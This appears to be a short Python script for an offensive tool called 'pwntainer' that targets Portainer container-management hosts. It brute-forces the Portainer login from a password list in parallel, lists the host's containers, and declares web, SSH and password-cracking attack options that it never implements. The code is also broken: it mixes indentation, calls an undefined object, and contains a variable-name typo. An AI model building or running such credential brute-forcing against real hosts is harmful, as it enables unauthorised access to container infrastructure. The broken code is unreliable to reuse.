from multiprocessing import Pool
import sys
from pprint import pprint
import argparse

from modules import auth
from modules import containers

# Initialize the authentication object and supply host address and positional argument

def bruteforce(pw_list):

	with open(pw_list) as pass_list:
		passwords = pass_list.readlines()

	with Pool(4) as pool:
		results = pool.map(a.login, passwords)
		print(results)

def fetch_containers():

	print("[+] Fetching a list of available containers")
	cont = containers.Containers(sys.argv[1], 1)
	return cont.list_containers()

def main():

	parser = argparse.ArgumentParser(prog='pwntainer', description='', usage='%(prog)s [options] host')
        parser.add_argument('host', help='-The ip address of the running portainer e.g 172.156.0.25:9000')
        
        Authentication = parser.add_argument_group('Authentication', 'This will be the description')
        Authentication.add_argument('--bruteforce', '-b', help='must be used with -l  and -u option')
        Authentication.add_argument('--username', '-u', help='provide a username default admin')
        Authentication.add_argument('--password', '-p', help='provide a username', required=True)
        Authentication.add_argument('--passlist', '-l', help='prvide a passwordlist must be used with -u option')

        optCommands = parser.add_argument_group('Attacks', 'description')
        optCommands.add_argument('--info', '-i')
        optCommands.add_argument('--webpwn', '-w' )
        optCommands.add_argument('--sshpwn', '-s')
        optCommands.add_argument('--pwnWithJohn', '-j')
        optCommands.add_argument('--all', '-a')
        
        arguments = parser.parse_args()
        if arguments.host:
            auth.Auth(arguments.host)
        if arguments.bruteforce:
            passlist = argument.passlist
            bruteforce(passlist)
        if arguments.password:
            fetch_containers()

if __name__ == "__main__":
    main()
    
